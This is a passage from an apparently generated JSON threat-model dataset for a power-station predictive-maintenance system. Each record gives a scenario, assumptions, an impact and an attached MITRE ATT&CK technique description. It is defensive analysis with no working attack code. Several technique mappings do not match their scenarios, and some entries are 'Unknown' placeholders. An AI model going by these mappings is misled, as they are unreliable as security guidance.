                    "Assumption": "Cloud environment vulnerabilities are exploited by the attacker.",
                    "Role": "Attacker",
                    "Condition": "Cloud service misconfigurations or known vulnerabilities exist."
                }
            ],
            "Potential Impact": "Model parameters falling into unauthorized hands, allowing for reverse engineering.",
            "MITRE ATT&CK Keywords": [
                "model data leakage",
                "cloud security",
                "parameter extraction",
                "data protection"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the data logger with excessive data to disrupt its operation.",
            "Assumptions": [
                {
                    "Assumption": "Rate limiting and traffic management are not implemented.",
                    "Role": "System Admin",
                    "Condition": "The data logger lacks protection against high volume traffic."
                },
                {
                    "Assumption": "The attacker has sufficient resources and network access.",
                    "Role": "Attacker",
                    "Condition": "Network security to the data logger is weak."
                }
            ],
            "Potential Impact": "Disruption of data collection and subsequent failure in predictive maintenance.",
            "MITRE ATT&CK Keywords": [
                "flood attack",
                "traffic overload",
                "data logger",
                "system disruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A DDoS attack targets the cloud-based TOREADOR platform.",
            "Assumptions": [
                {
                    "Assumption": "The TOREADOR platform is not resilient against DDoS attacks.",
                    "Role": "System Admin",
                    "Condition": "Lack of robust DDoS mitigation strategies."
                },
                {
                    "Assumption": "The attacker can execute large-scale DDoS attacks.",
                    "Role": "Attacker",
                    "Condition": "Attacker has access to botnets or other DDoS tools."
                }
            ],
            "Potential Impact": "Service unavailability affecting real-time AI/ML model predictions.",
            "MITRE ATT&CK Keywords": [
                "DDoS attack",
                "cloud disruption",
                "service unavailability",
                "platform resilience"
            ],
            "mitre_technique": {
                "name": "Endpoint Denial of Service",
                "description": "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.(Citation: ArsTechnica Great Firewall of China)\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](https://attack.mitre.org/techniques/T1498).\n",
                "id": "attack-pattern--c675646d-e204-4aa8-978d-e3d6d65885c4",
                "technique_id": "T1499"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker targets the dashboard with a DoS attack to prevent user access.",
            "Assumptions": [
                {
                    "Assumption": "The dashboard lacks proper DoS prevention measures.",
                    "Role": "System Admin",
                    "Condition": "Insufficient security measures against DoS attacks."
                },
                {
                    "Assumption": "The attacker can generate sufficient traffic to impact the dashboard.",
                    "Role": "Attacker",
                    "Condition": "Attacker\u2019s resources are not limited."
                }
            ],
            "Potential Impact": "Inaccessibility for users, leading to delayed maintenance and operational decisions.",
            "MITRE ATT&CK Keywords": [
                "DoS attack",
                "dashboard",
                "user inaccessibility",
                "traffic generation"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses a local root-of-trust exploit on the data logger to gain higher privileges.",
            "Assumptions": [
                {
                    "Assumption": "The local root-of-trust mechanism is vulnerable.",
                    "Role": "Attacker",
                    "Condition": "Existing vulnerabilities in the root-of-trust implementation."
                },
                {
                    "Assumption": "The attacker can access the data logger physically or remotely.",
                    "Role": "Attacker",
                    "Condition": "Weak physical or network security measures."
                }
            ],
            "Potential Impact": "Compromised data integrity and potential manipulation of data logger operations.",
            "MITRE ATT&CK Keywords": [
                "root-of-trust exploit",
                "privilege escalation",
                "data logger",
                "vulnerability"
            ],
            "mitre_technique": {
                "name": "Service Registry Permissions Weakness",
                "description": "Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe, [PowerShell](https://attack.mitre.org/techniques/T1086), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through Access Control Lists and permissions. (Citation: MSDN Registry Key Security)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter Registry keys associated with service failure parameters (such as <code>FailureCommand</code>) that may be executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: TrustedSignal Service Failure)(Citation: Twitter Service Recovery Nov 2017)",
                "id": "attack-pattern--39a130e1-6ab7-434a-8bd2-418e7d9d6427",
                "technique_id": "T1058"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits vulnerabilities in the cloud-based TOREADOR platform to gain higher privileges.",
            "Assumptions": [
                {
                    "Assumption": "The cloud platform has exploitable vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Vulnerabilities are known or easily discoverable."
                },
                {
                    "Assumption": "The attacker has necessary access to attempt exploitation.",
                    "Role": "Attacker",
                    "Condition": "Lack of strong access control and monitoring."
                }
            ],
            "Potential Impact": "Full control over AI/ML model operations and access to sensitive data.",
            "MITRE ATT&CK Keywords": [
                "cloud security",
                "privilege escalation",
                "platform vulnerability",
                "control"
            ],
            "mitre_technique": {
                "name": "Bypass User Account Control",
                "description": "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.(Citation: TechNet How UAC Works)\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box.(Citation: TechNet Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)",
                "id": "attack-pattern--120d5519-3098-4e1c-9191-2aa61232f073",
                "technique_id": "T1548.002"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An internal user exploits insufficient permissions management to gain unauthorized access to more sensitive sections of the system.",
            "Assumptions": [
                {
                    "Assumption": "Permissions are not properly segregated based on roles.",
                    "Role": "System Admin",
                    "Condition": "Weak permissions management and role segregation."
                },
                {
                    "Assumption": "The internal user has the necessary knowledge to identify and exploit permission gaps.",
                    "Role": "Internal User",
                    "Condition": "In-depth knowledge of system architecture and permissions."
                }
            ],
            "Potential Impact": "Access to sensitive data and configuration changes leading to potential misuse or manipulation.",
            "MITRE ATT&CK Keywords": [
                "permissions management",
                "internal threat",
                "role segregation",
                "system architecture"
            ],
            "mitre_technique": {
                "name": "Data from Information Repositories",
                "description": "Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information. Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization. \n\nThe following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources\n\nInformation stored in a repository may vary based on the specific instance or environment. Specific common information repositories include web-based platforms such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002) and [Confluence](https://attack.mitre.org/techniques/T1213/001), specific services such as Code Repositories, IaaS databases, enterprise databases, and other storage infrastructure such as SQL Server.",
                "id": "attack-pattern--d28ef391-8ed4-45dc-bc4a-2f43abf54416",
                "technique_id": "T1213"
            }
        }
    ]
},
{
    "case_number": "9",
    "batch_number": "29",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof sensor data to provide incorrect readings, leading to flawed predictions and power optimization decisions.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical access to sensor deployment locations.",
                    "Role": "Attacker",
                    "Condition": "Physical access at the power station site"
                },
                {
                    "Assumption": "The sensor data lacks strong authentication mechanisms to validate the origin.",
                    "Role": "System Designer",
                    "Condition": "Reliance on unsophisticated data authentication methods"
                },
                {
                    "Assumption": "There is no secure channel for sensor data communication.",
                    "Role": "Network Engineer",
                    "Condition": "Unprotected communication paths between sensors and the data logger"
                }
            ],
            "Potential Impact": "Data integrity is compromised, leading to incorrect maintenance schedules and power flow optimization.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "data integrity",
                "sensor",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could gain unauthorized access to the dashboard using a compromised employee's credentials.",
            "Assumptions": [
                {
                    "Assumption": "Weak employee password policies and no multi-factor authentication.",
                    "Role": "Employee",
                    "Condition": "Usage of easy-to-guess passwords"
                },
                {
                    "Assumption": "The attacker has access to the employee's login details.",
                    "Role": "Attacker",
                    "Condition": "Phishing or social engineering"
                },
                {
                    "Assumption": "The system does not monitor unusual login activity.",
                    "Role": "Security Administrator",
                    "Condition": "Lack of anomaly detection mechanisms"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and operational control, impacting data confidentiality and integrity.",
            "MITRE ATT&CK Keywords": [
                "credential access",
                "spoofing",
                "social engineering",
                "phishing"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "A malicious entity could impersonate the data logger to send falsified data to the Receiver.",
            "Assumptions": [
                {
                    "Assumption": "Data loggers and Receivers do not use mutual authentication.",
                    "Role": "System Architect",
                    "Condition": "Lack of strong mutual authentication protocols like TLS"
                },
                {
                    "Assumption": "The communication channel is vulnerable to man-in-the-middle attacks.",
                    "Role": "Network Administrator",
                    "Condition": "Insecure communication protocols"
                },
                {
                    "Assumption": "The attacker can intercept and modify the data traffic.",
                    "Role": "Attacker",
                    "Condition": "Presence on the same network or physical access"
                }
            ],
            "Potential Impact": "Data integrity and availability are compromised, leading to incorrect predictions and operational disruptions.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "man-in-the-middle",
                "data integrity",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies sensor data in transit to the data logger.",
            "Assumptions": [
                {
                    "Assumption": "Traffic between sensors and the data logger is not encrypted.",
                    "Role": "Network Engineer",
                    "Condition": "Usage of unencrypted communication protocols"
                },
                {
                    "Assumption": "The attacker can intercept and alter the data.",
                    "Role": "Attacker",
                    "Condition": "Network access"
                },
                {
                    "Assumption": "No integrity checks on received data at the data logger.",
                    "Role": "System Developer",
                    "Condition": "Absence of data tampering detection mechanisms"
                }
            ],
            "Potential Impact": "Data integrity is compromised, leading to incorrect maintenance schedules and power flow optimization.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data integrity",
                "network",
                "interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker deploys malicious code on the dashboard to alter displayed metrics and predictions.",
            "Assumptions": [
                {
                    "Assumption": "Dashboard web application has unpatched vulnerabilities.",
                    "Role": "Software Developer",
                    "Condition": "Presence of exploitable web vulnerabilities"
                },
                {
                    "Assumption": "No validation of inputs on the dashboard interface.",
                    "Role": "Frontend Developer",
                    "Condition": "Weak input validation mechanisms"
                },
                {
                    "Assumption": "The attacker has access to execute code on the server hosting the dashboard.",
                    "Role": "Intruder",
                    "Condition": "Server compromise via some vulnerability"
                }
            ],
            "Potential Impact": "Data visualization integrity and user trust are compromised.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "web application",
                "code injection",
                "dashboard"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters the ML model parameters to provide biased predictions.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the TOREADOR Platform.",
                    "Role": "Attacker",
                    "Condition": "Compromised credentials or weak access controls"
                },
                {
                    "Assumption": "ML model configurations are not protected.",
                    "Role": "Data Scientist",
                    "Condition": "Lack of sufficient model parameter protection"
                },
                {
                    "Assumption": "No audit logging of changes to ML models.",
                    "Role": "System Administrator",
                    "Condition": "Absence of comprehensive audit logging"
                }
            ],
            "Potential Impact": "Data integrity and system reliability are compromised.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "ML models",
                "parameter manipulation",
                "cloud"
            ],
            "mitre_technique": {
                "name": "Modify Cloud Compute Infrastructure",
                "description": "An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.\n\nPermissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.(Citation: Mandiant M-Trends 2020)",
                "id": "attack-pattern--144e007b-e638-431d-a894-45d90c54ab90",
                "technique_id": "T1578"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An employee denies making changes to system configurations or model parameters.",
            "Assumptions": [
                {
                    "Assumption": "System lacks comprehensive logging mechanisms.",
                    "Role": "System Administrator",
                    "Condition": "Lack of sufficient logging measures"
                },
                {
                    "Assumption": "No secure authentication for sensitive actions.",
                    "Role": "System Architect",
                    "Condition": "Weak authentication for critical actions"
                },
                {
                    "Assumption": "No non-repudiation controls in place.",
                    "Role": "Security Officer",
                    "Condition": "Absence of measures such as digital signatures"
                }
            ],
            "Potential Impact": "Accountability and traceability are compromised.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "audit trail",
                "authentication"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies modifying the anonymized sensor data before it is used for training.",
            "Assumptions": [
                {
                    "Assumption": "Changes in data processing steps are not logged.",
                    "Role": "System Developer",
                    "Condition": "Lack of logging in data pipelines"
                },
                {
                    "Assumption": "Data processing lacks integrity checks.",
                    "Role": "Data Engineer",
                    "Condition": "Absence of integrity verification mechanisms"
                },
                {
                    "Assumption": "No robust access controls for data processing.",
                    "Role": "Security Administrator",
                    "Condition": "Inadequate access management"
                }
            ],
            "Potential Impact": "Data integrity and accountability in data processing are compromised.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "data processing",
                "logging",
                "access control"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies accessing confidential reports on the dashboard.",
            "Assumptions": [
                {
                    "Assumption": "No logging of user access to dashboard components.",
                    "Role": "System Administrator",
                    "Condition": "Lack of access logs"
                },
                {
                    "Assumption": "Authentication logs are tampered with or deleted.",
                    "Role": "Attacker",
                    "Condition": "Authenticated access to log files"
                },
                {
                    "Assumption": "No mechanism to verify authenticity of access logs.",
                    "Role": "Security Officer",
                    "Condition": "Absence of log verification methods"
                }
            ],
            "Potential Impact": "Accountability and traceability of accessing sensitive information are compromised.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "access logs",
                "dashboard",
                "confidential data"
            ],
            "mitre_technique": {
                "name": "Cloud Service Dashboard",
                "description": "An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, findings of potential security risks, and to run additional queries, such as finding public IP addresses and open ports.(Citation: Google Command Center Dashboard)\n\nDepending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This allows the adversary to gain information without making any API requests.",
                "id": "attack-pattern--e49920b0-6c54-40c1-9571-73723653205f",
                "technique_id": "T1538"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted sensor data.",
            "Assumptions": [
                {
                    "Assumption": "Sensor data communication is not encrypted.",
                    "Role": "Network Engineer",
                    "Condition": "Usage of unencrypted communication"
                },
                {
                    "Assumption": "The attacker has access to the network paths.",
                    "Role": "Attacker",
                    "Condition": "Network presence or physical access"
                },
                {
